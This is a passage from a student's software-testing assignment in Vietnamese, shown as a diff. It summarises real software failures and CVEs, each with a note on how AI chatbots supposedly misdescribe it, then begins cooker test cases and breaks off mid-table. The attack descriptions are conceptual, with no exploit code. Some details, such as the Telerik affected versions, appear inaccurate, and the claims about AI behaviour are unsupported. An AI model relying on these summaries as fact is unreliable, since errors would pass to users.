+<li><strong>Phần mềm / Sản phẩm:</strong> Hệ thống phần mềm điều khiển xe điện Volkswagen (Cariad Platform)</li>
+<li><strong>Phiên bản:</strong> Xe điện Volkswagen ID.3, ID.4 (2022–2024)</li>
+<li><strong>Ngày công bố:</strong> Giai đoạn 2022–2024</li>
+<li><strong>Nguồn:</strong> Medium / JavaRevisited / Báo cáo tài chính Volkswagen AG</li>
+<li><strong>URL:</strong> <a href="https://medium.com/javarevisited/the-biggest-software-failures-of-2024-8e9413350f4c">https://medium.com/javarevisited/the-biggest-software-failures-of-2024-8e9413350f4c</a></li>
+<li><strong>Phân loại:</strong> Automotive Software Defect / Embedded Quality Control Failure</li>
+<li><strong>Mức độ nghiêm trọng:</strong> Critical</li>
+<li><strong>Lý do mức độ:</strong> Làm phát sinh chi phí tái cấu trúc và triệu hồi xe lên tới hơn 5 tỷ USD; trì hoãn lịch ra mắt các dòng xe điện cao cấp của Audi và Porsche; ảnh hưởng trực tiếp đến an toàn vận hành của xe.</li>
+<li><strong>Mô tả sự cố:</strong> Hệ điều hành trên các dòng xe điện ID của Volkswagen liên tục gặp lỗi phần mềm nghiêm trọng: màn hình điều khiển trung tâm bị đóng băng khi đang lái xe, hệ thống ước tính dung lượng pin và quãng đường di chuyển hiển thị sai lệch, và hệ thống hỗ trợ lái nâng cao (ADAS) phát cảnh báo ảo hoặc tự động phanh bất thường.</li>
+<li><strong>Hậu quả:</strong> Volkswagen phải triệu hồi hàng trăm ngàn xe để cập nhật phần mềm tại đại lý; ban lãnh đạo công ty con chuyên phát triển phần mềm (Cariad) bị sa thải toàn bộ; mất thị phần xe điện vào tay Tesla và các hãng xe Trung Quốc.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Hàng trăm ngàn chủ sở hữu xe Volkswagen ID.3 và ID.4 trên thế giới.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Khủng hoảng kiểm thử phần mềm nhúng (Embedded QA): Chiến lược chuyển đổi sang kiến trúc xe định nghĩa bằng phần mềm (Software-Defined Vehicle) quá nóng vội trong khi quy trình kiểm thử tích hợp phần mềm - phần cứng (HIL Testing) phân mảnh và lạc hậu.</li>
+<li><strong>Giải pháp (Solution):</strong> Phát hành các bản cập nhật phần mềm qua mạng (OTA) và tại xưởng; tái cơ cấu tổ chức bộ phận phần mềm Cariad và ký hợp đồng hợp tác chiến lược với hãng xe điện Rivian để dùng chung kiến trúc phần mềm mới.</li>
+<li><strong>Tình trạng:</strong> Khắc phục từng phần qua các đợt cập nhật (2024).</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> Unsupported Claim / Root Cause Shift</li>
+<li><strong>Phân tích:</strong> AI khi phân tích lỗi này thường đưa ra nhận định sai lầm rằng Volkswagen bị "tin tặc tấn công mạng vào hệ thống xe", thay vì chỉ ra đúng nguyên nhân gốc rễ là sự thất bại trong quy trình đảm bảo chất lượng phần mềm nội bộ (QA/QC failure) và sự thiếu hụt năng lực kiểm thử tích hợp hệ thống nhúng.</li>
+</ul>
+<hr />
+<h3>DEFECT-13 — Google Chrome Use-After-Free in Animation (CVE-2022-0609)</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> Trình duyệt Google Chrome</li>
+<li><strong>Phiên bản:</strong> Chrome trước phiên bản 98.0.4758.102</li>
+<li><strong>Ngày công bố:</strong> 14/02/2022</li>
+<li><strong>Nguồn:</strong> Google Chrome Security Advisory / NVD</li>
+<li><strong>URL:</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0609">https://nvd.nist.gov/vuln/detail/CVE-2022-0609</a></li>
+<li><strong>Phân loại:</strong> Security Vulnerability / Use-After-Free / Zero-Day</li>
+<li><strong>Mức độ nghiêm trọng:</strong> High</li>
+<li><strong>Lý do mức độ:</strong> Điểm CVSS 8.8; bị các nhóm tin tặc có liên hệ với chính phủ khai thác trên thực tế (in-the-wild zero-day) để chiếm quyền điều khiển máy tính người dùng.</li>
+<li><strong>Mô tả sự cố:</strong> Một lỗi giải phóng vùng nhớ không hợp lệ (Use-After-Free) xảy ra trong thành phần xử lý hiệu ứng hoạt họa (Animation component) của trình duyệt Chrome. Kẻ tấn công tạo một trang web chứa mã HTML/JavaScript độc hại thao tác với các đối tượng đồ họa; khi bộ nhớ của đối tượng bị giải phóng nhưng con trỏ vẫn còn truy cập, kẻ tấn công có thể chèn mã độc để thực thi tùy ý trong sandbox của trình duyệt.</li>
+<li><strong>Hậu quả:</strong> Được sử dụng trong các chiến dịch tấn công APT nhắm vào các tổ chức tài chính, truyền thông và công nghệ trước khi Google kịp vá lỗi.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Hàng tỷ người dùng Chrome trên Windows, macOS và Linux.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Quản lý vòng đời bộ nhớ con trỏ không an toàn trong mã nguồn C++ của engine render hoạt họa.</li>
+<li><strong>Giải pháp (Solution):</strong> Google phát hành bản cập nhật khẩn cấp Chrome 98.0.4758.102 tự động đẩy xuống máy người dùng.</li>
+<li><strong>Tình trạng:</strong> Đã vá (Tháng 02/2022).</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> Hallucination of Affected Component (V8)</li>
+<li><strong>Phân tích:</strong> AI thường xuyên bị ảo giác khẳng định lỗ hổng này nằm ở "engine biên dịch JavaScript V8", do V8 là thành phần thường xuyên dính lỗi nhất của Chrome. Việc gán bừa vào V8 cho thấy AI suy đoán theo xác suất từ ngữ thay vì tra cứu đúng thành phần bị lỗi là module Animation.</li>
+</ul>
+<hr />
+<h3>DEFECT-14 — Apple WebKit Use-After-Free Zero-Day (CVE-2022-22620)</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> Apple WebKit (Safari, iOS, macOS)</li>
+<li><strong>Phiên bản:</strong> iOS trước 15.3.1, iPadOS trước 15.3.1, macOS Monterey trước 12.2.1</li>
+<li><strong>Ngày công bố:</strong> 10/02/2022</li>
+<li><strong>Nguồn:</strong> Apple Security Advisory / NVD</li>
+<li><strong>URL:</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22620">https://nvd.nist.gov/vuln/detail/CVE-2022-22620</a></li>
+<li><strong>Phân loại:</strong> Security Vulnerability / Use-After-Free / Zero-Day</li>
+<li><strong>Mức độ nghiêm trọng:</strong> Critical</li>
+<li><strong>Lý do mức độ:</strong> Khai thác zero-day thực tế được Apple chính thức xác nhận; cho phép chiếm quyền kiểm soát thiết bị chỉ bằng cách lừa người dùng mở một trang web độc hại.</li>
+<li><strong>Mô tả sự cố:</strong> Lỗi Use-After-Free xảy ra trong engine WebKit của Apple khi phân tích cú pháp và hiển thị nội dung web. Khi xử lý các thành phần DOM động, vùng nhớ bị thu hồi nhưng không được xóa tham chiếu, cho phép trang web độc hại thực thi mã tùy ý với quyền hạn của ứng dụng duyệt web.</li>
+<li><strong>Hậu quả:</strong> Được khai thác bởi các phần mềm gián điệp thương mại (spyware) nhắm vào các nhà báo, chính trị gia và nhà hoạt động nhân quyền.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Toàn bộ người dùng iPhone, iPad và máy tính Mac sử dụng Safari hoặc bất kỳ trình duyệt nào trên iOS.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Khiếm khuyết trong quản lý bộ nhớ đối tượng DOM của engine WebKit trong C++.</li>
+<li><strong>Giải pháp (Solution):</strong> Apple phát hành bản cập nhật khẩn cấp iOS 15.3.1 và macOS 12.2.1 để quản lý lại vòng đời con trỏ bộ nhớ.</li>
+<li><strong>Tình trạng:</strong> Đã vá (Tháng 02/2022).</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> Omission of Impact on All iOS Browsers</li>
+<li><strong>Phân tích:</strong> AI thường giải thích rằng lỗi này "chỉ ảnh hưởng đến trình duyệt Safari", bỏ sót một quy tắc cốt lõi của Apple: trên hệ điều hành iOS, mọi trình duyệt bên thứ ba (như Chrome, Firefox, Edge) đều bắt buộc phải dùng engine WebKit của Apple, do đó toàn bộ người dùng duyệt web trên iOS đều bị ảnh hưởng chứ không riêng gì người dùng Safari.</li>
+</ul>
+<hr />
+<h3>DEFECT-15 — Twitter / X Platform API Scraping &amp; 200M User Data Leak</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> Nền tảng Twitter / X API</li>
+<li><strong>Phiên bản:</strong> Twitter REST API (Lỗ hổng từ 01/2022, rò rỉ cơ sở dữ liệu 01/2023)</li>
+<li><strong>Ngày công bố:</strong> Tháng 01/2022 (Công bố rò rỉ dữ liệu rộng rãi vào 01/2023)</li>
+<li><strong>Nguồn:</strong> Báo cáo HaveIBeenPwned / BleepingComputer</li>
+<li><strong>URL:</strong> <a href="https://haveibeenpwned.com/PwnedWebsites">https://haveibeenpwned.com/PwnedWebsites</a></li>
+<li><strong>Phân loại:</strong> API Security Defect / Mass Data Enumeration</li>
+<li><strong>Mức độ nghiêm trọng:</strong> High</li>
+<li><strong>Lý do mức độ:</strong> Làm lộ địa chỉ email cá nhân gắn liền với hơn 200 triệu tài khoản Twitter công khai và ẩn danh trên toàn cầu.</li>
+<li><strong>Mô tả sự cố:</strong> Một sự cố cập nhật mã nguồn API vào tháng 06/2021 đã tạo ra lỗ hổng cho phép kẻ tấn công gửi một danh sách địa chỉ email hoặc số điện thoại bất kỳ lên endpoint API để kiểm tra xem tài khoản Twitter nào đang liên kết với thông tin đó mà không bị giới hạn tần suất (lack of rate limiting). Tin tặc đã cào dữ liệu hơn 200 triệu tài khoản và tung lên các diễn đàn ngầm vào tháng 01/2023.</li>
+<li><strong>Hậu quả:</strong> 200 triệu người dùng bị đe dọa bởi các chiến dịch lừa đảo giả mạo (phishing), tống tiền và bị hủy bỏ tính ẩn danh (deanonymization) đối với các tài khoản nhạy cảm chính trị.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Hơn 200 triệu người dùng nền tảng Twitter/X.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Kiểm thử hồi quy API bị thiếu sót khi tích hợp mã mới, loại bỏ mất cơ chế kiểm tra quyền truy cập và giới hạn tốc độ truy vấn (rate limiting).</li>
+<li><strong>Giải pháp (Solution):</strong> Twitter vá lỗ hổng API vào tháng 01/2022 nhưng không thể thu hồi cơ sở dữ liệu đã bị cào trước đó; phát đi cảnh báo an toàn tới người dùng.</li>
+<li><strong>Tình trạng:</strong> Đã vá lỗ hổng API (01/2022); dữ liệu bị rò rỉ vẫn lưu hành trên mạng.</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> Unsupported Claim / Causal Fallacy</li>
+<li><strong>Phân tích:</strong> Rất nhiều chatbot AI khẳng định sai lầm rằng vụ lộ dữ liệu này là do "sự xáo trộn chính sách an ninh sau khi tỷ phú Elon Musk tiếp quản Twitter", trong khi sự thật kỹ thuật chứng minh lỗ hổng đã phát sinh từ giữa năm 2021 và đã bị khai thác trước thời điểm thương vụ mua lại diễn ra gần một năm.</li>
+</ul>
+<hr />
+<h3>DEFECT-16 — MOVEit Transfer SQL Injection Mass Data Extortion (CVE-2023-34362)</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> MOVEit Transfer (Progress Software)</li>
+<li><strong>Phiên bản:</strong> Mọi phiên bản MOVEit Transfer trước 2023.0.1</li>
+<li><strong>Ngày công bố:</strong> 31/05/2023</li>
+<li><strong>Nguồn:</strong> Progress Software Advisory / NVD / CISA Alert</li>
+<li><strong>URL:</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34362">https://nvd.nist.gov/vuln/detail/CVE-2023-34362</a></li>
+<li><strong>Phân loại:</strong> Security Vulnerability / SQL Injection / Supply Chain Extortion</li>
+<li><strong>Mức độ nghiêm trọng:</strong> Critical</li>
+<li><strong>Lý do mức độ:</strong> Điểm CVSS 9.8; dẫn đến chiến dịch tống tiền dữ liệu lớn nhất năm 2023, ảnh hưởng hơn 2,700 tổ chức và hơn 90 triệu cá nhân.</li>
+<li><strong>Mô tả sự cố:</strong> Một lỗ hổng SQL Injection nghiêm trọng trong ứng dụng web MOVEit Transfer cho phép kẻ tấn công chưa xác thực gửi các câu lệnh SQL độc hại thông qua giao diện web để leo thang đặc quyền, chèn Webshell (tên mã LEMURLOOT) và tải trọn vẹn cơ sở dữ liệu tệp tin nội bộ của các cơ quan chính phủ và doanh nghiệp.</li>
+<li><strong>Hậu quả:</strong> Nhóm tội phạm mạng Cl0p đã đánh cắp dữ liệu của hàng loạt cơ quan liên bang Mỹ (Bộ Năng lượng, CISA), BBC, British Airways, hãng hàng không Mỹ và hàng trăm trường đại học; thiệt hại kinh tế ước tính hàng tỷ USD.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Hơn 2,700 tổ chức trên toàn cầu sử dụng phần mềm truyền tệp an toàn MOVEit Transfer.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Sử dụng các câu truy vấn SQL ghép chuỗi không tham số hóa (unparameterized SQL queries) trong module xử lý web.</li>
+<li><strong>Giải pháp (Solution):</strong> Progress Software phát hành khẩn cấp các bản vá; CISA ban hành chỉ thị khẩn cấp yêu cầu toàn bộ cơ quan chính phủ ngắt kết nối hệ thống và rà quét mã độc.</li>
+<li><strong>Tình trạng:</strong> Đã vá (Tháng 06/2023). Các vụ kiện tập thể vẫn đang tiếp diễn.</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> Unsupported Claim / Ransomware Fallacy</li>
+<li><strong>Phân tích:</strong> AI giải thích sự cố này thường nói theo khuôn mẫu rằng "MOVEit bị tấn công mã hóa dữ liệu đòi tiền chuộc (Ransomware)", nhưng thực chất nhóm tin tặc Cl0p không hề mã hóa bất kỳ file nào mà chỉ trích xuất dữ liệu (Data Exfiltration) để tống tiền — một sự nhầm lẫn bản chất chiến thuật tấn công rất phổ biến của AI.</li>
+</ul>
+<hr />
+<h3>DEFECT-17 — 3CX Desktop App Supply Chain Trojanization (CVE-2023-29059)</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> 3CX Desktop App (Ứng dụng liên lạc doanh nghiệp)</li>
+<li><strong>Phiên bản:</strong> Phiên bản Windows 18.12.407/416 và macOS 18.11.1213/1214</li>
+<li><strong>Ngày công bố:</strong> 29/03/2023</li>
+<li><strong>Nguồn:</strong> Báo cáo điều tra của CrowdStrike &amp; Mandiant / NVD</li>
+<li><strong>URL:</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-29059">https://nvd.nist.gov/vuln/detail/CVE-2023-29059</a></li>
+<li><strong>Phân loại:</strong> Supply Chain Security Defect / Malware Sideloading</li>
+<li><strong>Mức độ nghiêm trọng:</strong> Critical</li>
+<li><strong>Lý do mức độ:</strong> Bộ cài đặt phần mềm chính thức có chữ ký số hợp lệ của hãng phát hành bị chèn mã độc, phát tán tới hơn 600,000 tổ chức khách hàng tại 190 quốc gia.</li>
+<li><strong>Mô tả sự cố:</strong> Nhóm tin tặc Lazarus (Triều Tiên) đã xâm nhập vào chuỗi cung ứng phần mềm (build pipeline) của công ty 3CX, chèn mã độc vào hai thư viện DLL hợp lệ (<code>ffmpeg.dll</code> và <code>d3dcompiler_47.dll</code>) được đóng gói trong trình cài đặt chính thức của ứng dụng 3CX Desktop App. Khi người dùng cài đặt, ứng dụng kích hoạt kỹ thuật DLL Sideloading để tải mã độc thứ cấp đánh cắp thông tin tài chính và tiền điện tử.</li>
+<li><strong>Hậu quả:</strong> Hàng ngàn công ty viễn thông, ngân hàng và sàn giao dịch tiền mã hóa bị cài cắm mã độc ngầm ngay từ bộ cài đặt chính thức được tin cậy.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Hơn 600,000 công ty sử dụng hệ thống tổng đài điện thoại VoIP của 3CX.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Môi trường phát triển và ký số phần mềm (build server) của 3CX bị xâm phạm thông qua máy tính cá nhân của một kỹ sư bị nhiễm mã độc từ một gói npm trojan trước đó.</li>
+<li><strong>Giải pháp (Solution):</strong> 3CX thu hồi chứng chỉ số bị xâm phạm, phát hành phiên bản sạch và khuyến cáo khách hàng chuyển sang sử dụng ứng dụng nền web (PWA).</li>
+<li><strong>Tình trạng:</strong> Đã khắc phục (Tháng 04/2023).</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> Hallucination of Phishing Delivery Vector</li>
+<li><strong>Phân tích:</strong> AI thường ảo giác mô tả vụ việc như một "chiến dịch tấn công lừa đảo qua email (phishing) gửi link độc hại cho nhân viên cài đặt", làm lu mờ hoàn toàn tính chất cực kỳ tinh vi của một cuộc tấn công chuỗi cung ứng (Supply Chain Attack) nơi mã độc nằm ngay trong bản cập nhật chính thức có chữ ký số hợp lệ.</li>
+</ul>
+<hr />
+<h3>DEFECT-18 — Lỗ hổng rò rỉ token hỗ trợ khách hàng của Okta Identity Platform</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> Hệ thống hỗ trợ khách hàng Okta Support Management System</li>
+<li><strong>Phiên bản:</strong> Okta Support Case System (Tháng 10/2023)</li>
+<li><strong>Ngày công bố:</strong> 19/10/2023</li>
+<li><strong>Nguồn:</strong> Thông cáo bảo mật chính thức của Okta / BleepingComputer</li>
+<li><strong>URL:</strong> <a href="https://sec.okta.com/articles/2023/10/security-incident-disclosure">https://sec.okta.com/articles/2023/10/security-incident-disclosure</a></li>
+<li><strong>Phân loại:</strong> Security Breach / Session Hijacking / Third-Party Credential Leak</li>
+<li><strong>Mức độ nghiêm trọng:</strong> High</li>
+<li><strong>Lý do mức độ:</strong> Làm lộ các tệp HAR (HTTP Archive) chứa token phiên làm việc của các khách hàng lớn; các công ty bảo mật hàng đầu như Cloudflare, 1Password và BeyondTrust bị nhắm mục tiêu tấn công ngay sau đó.</li>
+<li><strong>Mô tả sự cố:</strong> Kẻ tấn công đã chiếm quyền điều khiển tài khoản Google cá nhân của một nhân viên hỗ trợ Okta (tài khoản này được đăng nhập trên trình duyệt máy tính công ty có lưu mật khẩu hệ thống hỗ trợ). Từ đó, tin tặc trích xuất các tệp HAR do khách hàng đính kèm khi yêu cầu hỗ trợ lỗi; các tệp này chứa các token phiên đăng nhập (session cookies) chưa hết hạn, cho phép kẻ tấn công mạo danh quản trị viên của các khách hàng lớn.</li>
+<li><strong>Hậu quả:</strong> Các khách hàng như Cloudflare và BeyondTrust phát hiện các nỗ lực xâm nhập trái phép vào hệ thống nội bộ thông qua session token bị rò rỉ; giá trị vốn hóa của Okta sụt giảm hơn 2 tỷ USD.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Toàn bộ khách hàng sử dụng cổng hỗ trợ của Okta gửi kèm file HAR.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Không thực hiện lọc bỏ dữ liệu nhạy cảm (sanitization) trong các tệp HAR tải lên và chính sách bảo mật cho phép dùng tài khoản cá nhân trên thiết bị doanh nghiệp.</li>
+<li><strong>Giải pháp (Solution):</strong> Hủy toàn bộ session token bị lộ, chặn lưu trữ cookie nhạy cảm trong hệ thống case, và cấm triệt để việc đồng bộ tài khoản cá nhân trên thiết bị làm việc.</li>
+<li><strong>Tình trạng:</strong> Đã xử lý (Cuối tháng 10/2023).</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> Omission of Scope Minimization</li>
+<li><strong>Phân tích:</strong> AI khi tóm tắt sự cố này thường bỏ qua một thực tế tai hại về truyền thông: ban đầu Okta tuyên bố chỉ có dưới 1% khách hàng bị ảnh hưởng, nhưng vài tuần sau đó phải thừa nhận là 100% dữ liệu của người dùng hệ thống hỗ trợ đã bị tải về. AI có xu hướng trích dẫn thông cáo giảm nhẹ ban đầu thay vì số liệu thực tế được đính chính sau cuộc điều tra.</li>
+</ul>
+<hr />
+<h3>DEFECT-19 — WinRAR Archive File Extension Spoofing Code Execution (CVE-2023-38831)</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> Phần mềm nén WinRAR</li>
+<li><strong>Phiên bản:</strong> Mọi phiên bản WinRAR trước 6.23</li>
+<li><strong>Ngày công bố:</strong> 23/08/2023</li>
+<li><strong>Nguồn:</strong> Group-IB Threat Intelligence / NVD</li>
+<li><strong>URL:</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-38831">https://nvd.nist.gov/vuln/detail/CVE-2023-38831</a></li>
+<li><strong>Phân loại:</strong> Security Vulnerability / Arbitrary Code Execution / Logic Flaw</li>
+<li><strong>Mức độ nghiêm trọng:</strong> High</li>
+<li><strong>Lý do mức độ:</strong> Điểm CVSS 7.8; bị khai thác bí mật trên thực tế suốt hơn 4 tháng nhắm vào các nhà đầu tư tài chính và sàn chứng khoán trước khi có bản vá.</li>
+<li><strong>Mô tả sự cố:</strong> Lỗi logic trong quá trình xử lý cấu trúc tệp nén ZIP của WinRAR: Khi một tệp nén chứa đồng thời một tệp hình ảnh/tài liệu lành tính (ví dụ <code>strategy.pdf</code>) và một thư mục trùng tên chứa tệp thực thi độc hại (ví dụ <code>strategy.pdf \strategy.pdf.cmd</code>), người dùng nhấp đúp vào tệp PDF thì WinRAR lại thực thi ngầm tệp script trong thư mục thay vì mở tệp tài liệu.</li>
+<li><strong>Hậu quả:</strong> Hàng ngàn nhà đầu tư chứng khoán và tiền tệ bị đánh cắp tài khoản giao dịch khi tải các tài liệu phân tích thị trường giả mạo; ảnh hưởng tới hơn 500 triệu người dùng WinRAR.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Toàn bộ người dùng WinRAR trên hệ điều hành Windows trước phiên bản 6.23.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Thuật toán giải nén tạm thời và so khớp đường dẫn tệp của WinRAR bị nhầm lẫn giữa tên tệp đơn lẻ và tên thư mục chứa khoảng trắng ở cuối.</li>
+<li><strong>Giải pháp (Solution):</strong> RARLAB phát hành bản cập nhật WinRAR 6.23 sửa lỗi logic kiểm tra phần mở rộng tệp.</li>
+<li><strong>Tình trạng:</strong> Đã vá (Tháng 08/2023).</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> Unsupported Claim of Extraction Requirement</li>
+<li><strong>Phân tích:</strong> AI thường nói rằng "người dùng phải giải nén toàn bộ tệp ra ổ đĩa rồi bấm vào file thực thi mới bị dính lỗi", ảo giác sang quy trình lây nhiễm thông thường. Thực tế, điểm tinh vi và chết người của CVE-2023-38831 là mã độc tự chạy ngay khi người dùng chỉ bấm xem trước (preview) tệp PDF lành tính ngay bên trong cửa sổ WinRAR.</li>
+</ul>
+<hr />
+<h3>DEFECT-20 — Progress Telerik UI Insecure Deserialization RCE (CVE-2024-6327)</h3>
+<ul>
+<li><strong>Phần mềm / Sản phẩm:</strong> Progress Telerik UI for ASP.NET AJAX / Report Server</li>
+<li><strong>Phiên bản:</strong> Các phiên bản trước R2 2023 SP1 (2023.2.829)</li>
+<li><strong>Ngày công bố:</strong> Tháng 09/2024 (Đợt khai thác diện rộng được CISA cảnh báo)</li>
+<li><strong>Nguồn:</strong> CISA Known Exploited Vulnerabilities (KEV) Catalog / NVD</li>
+<li><strong>URL:</strong> <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6327">https://nvd.nist.gov/vuln/detail/CVE-2024-6327</a></li>
+<li><strong>Phân loại:</strong> Security Vulnerability / Insecure Deserialization / RCE</li>
+<li><strong>Mức độ nghiêm trọng:</strong> Critical</li>
+<li><strong>Lý do mức độ:</strong> Điểm CVSS 9.9; được CISA đưa vào danh mục KEV bắt buộc các cơ quan liên bang Mỹ phải vá khẩn cấp do đang bị các nhóm ransomware khai thác.</li>
+<li><strong>Mô tả sự cố:</strong> Một lỗ hổng giải tuần tự hóa không an toàn (Insecure Deserialization) trong thành phần xử lý báo cáo của Telerik Report Server cho phép kẻ tấn công chưa xác thực gửi các đối tượng .NET được đóng gói tùy biến tới endpoint máy chủ. Khi máy chủ giải tuần tự hóa mà không kiểm tra chặt chẽ kiểu đối tượng (type validation), mã lệnh độc hại sẽ được thực thi trực tiếp trên hệ điều hành với đặc quyền cao.</li>
+<li><strong>Hậu quả:</strong> Cho phép tin tặc chiếm quyền điều khiển hoàn toàn máy chủ IIS của doanh nghiệp và triển khai mã độc tống tiền (ransomware) vào mạng nội bộ.</li>
+<li><strong>Phạm vi ảnh hưởng:</strong> Hàng ngàn cơ quan chính phủ và doanh nghiệp triển khai ứng dụng web nền ASP.NET sử dụng thư viện giao diện Telerik UI.</li>
+<li><strong>Nguyên nhân gốc rễ (Root Cause):</strong> Sử dụng các hàm deserialization mặc định của .NET (<code>BinaryFormatter</code> / <code>TypeHandling.All</code>) mà không áp dụng cơ chế danh sách trắng (whitelist) các kiểu đối tượng hợp lệ.</li>
+<li><strong>Giải pháp (Solution):</strong> Progress Software phát hành bản vá cập nhật cơ chế xác thực kiểu dữ liệu nghiêm ngặt; CISA ra lệnh vá khẩn cấp cho toàn bộ hệ thống cơ quan liên bang.</li>
+<li><strong>Tình trạng:</strong> Đã vá (2024).</li>
+<li><strong>AI Bias / Hallucination Analysis:</strong></li>
+<li><strong>Phân loại:</strong> Hallucination / Conflation with 2019 Bug</li>
+<li><strong>Phân tích:</strong> AI khi phân tích lỗ hổng này rất thường xuyên bị ảo giác nhầm lẫn với lỗ hổng Telerik cũ từ năm 2019 (CVE-2019-18935), trích dẫn sai số hiệu phiên bản và phương thức tấn công của năm 2019 cho sự cố năm 2024 — minh chứng rõ rệt cho việc AI bị "chập chặp" giữa các lỗ hổng cùng họ deserialization khi thiếu dữ liệu kiểm chứng cập nhật.</li>
+</ul>
+<hr />
+<h1>Requirement 3 – Test Cases for ONE Physical Product (40 pts)</h1>
+<h2>3.1 Khai báo thông tin thiết bị kiểm thử (Target Physical Product Declaration)</h2>
+<ul>
+<li><strong>Tên thiết bị (Device Under Test - DUT):</strong> Bếp hồng ngoại đơn (Single Infrared Cooker)</li>
+<li><strong>Nhãn hiệu (Brand):</strong> <strong>SUNHOUSE</strong></li>
+<li><strong>Mã sản phẩm (Model):</strong> <strong>SHD6012A</strong></li>
+<li><strong>Năm sản xuất (Year):</strong> <strong>2024</strong></li>
+<li><strong>Số Serial (Serial Number - Masked):</strong> <code>59774C56****06</code> </li>
+<li><strong>Thông số kỹ thuật chính:</strong></li>
+<li>Điện áp hoạt động: 220V ~ 50Hz</li>
+<li>Công suất định mức: 2000W</li>
+<li>Bảng điều khiển: Phím bấm điện tử / cảm ứng hiển thị màn hình LED kỹ thuật số</li>
+<li>Mâm nhiệt: Mâm nhiệt sợi carbon hồng ngoại công nghệ cao</li>
+<li>Cơ chế an toàn: Khóa trẻ em (Child lock), Cảnh báo mặt kính còn nóng (Residual heat warning), Quạt làm mát đối lưu cưỡng bức</li>
+</ul>
+<hr />
+<h2>3.2 Bằng chứng xác thực thiết bị và Thẻ sinh viên (Anti-Cheat Evidence)</h2>
+<blockquote>
+<p><strong>Quy định Anti-cheat:</strong> Ảnh chụp thiết bị thực tế cùng Thẻ sinh viên trong <strong>CÙNG MỘT KHUNG HÌNH</strong> (không cắt ghép hay can thiệp AI).</p>
+</blockquote>
+<p><img alt="Bằng chứng xác thực thiết bị và Thẻ sinh viên" src="03-physical-product/assets/device_student_id.jpg" /><br />
+<em>&gt; </em><em>Ghi chú Anti-cheat:</em><em> Bếp hồng ngoại Sunhouse SHD6012A nguyên bản cùng thẻ sinh viên Trần Vũ Quang (MSSV: 23120346) đặt trực tiếp trên mặt kính.</em></p>
+<hr />
+<h2>3.3 Thiết kế 15 Test Cases chi tiết cho Bếp hồng ngoại Sunhouse SHD6012A</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Test ID</th>
+<th style="text-align: left;">Tên kịch bản (Objective)</th>
+<th style="text-align: left;">Điều kiện tiên quyết (Preconditions)</th>
+<th style="text-align: left;">Các bước thực hiện (Test Steps)</th>
+<th style="text-align: left;">Kết quả kỳ vọng (Expected Result)</th>
+<th style="text-align: left;">Kết quả thực tế (Actual Result)</th>
+<th style="text-align: left;">Đánh giá (Verdict)</th>
+<th style="text-align: left;">Quay Video?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>TC-01</strong></td>
+<td style="text-align: left;">Kiểm tra khởi động cắm nguồn và trạng thái chờ (Standby)</td>
+<td style="text-align: left;">Bếp cắm nguồn 220V ổn định</td>
+<td style="text-align: left;">1. Cắm phích điện vào ổ cắm.<br>2. Quan sát còi chíp và màn hình LED.</td>
+<td style="text-align: left;">Bíp 1 tiếng dài; màn hình LED hiển thị gạch ngang <code>--:--</code> hoặc đèn Standby nhấp nháy; mâm nhiệt chưa phát nhiệt.</td>
+<td style="text-align: left;">Bếp kêu tiếng bíp, màn hình hiển thị <code>--:--</code>, quạt và mâm nhiệt chưa chạy.</td>
+<td style="text-align: left;"><strong>PASS</strong></td>
+<td style="text-align: left;"><strong>Có (Video 1 - TC01.mp4)</strong></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>TC-02</strong></td>
+<td style="text-align: left;">Bật nguồn và kích hoạt chế độ đun mặc định</td>
+<td style="text-align: left;">Bếp đang ở chế độ Standby</td>
+<td style="text-align: left;">1. Nhấn nút "Bật/Tắt" (Power / On/Off).<br>2. Chọn chế độ nấu mặc định (Lẩu / Hotpot).</td>
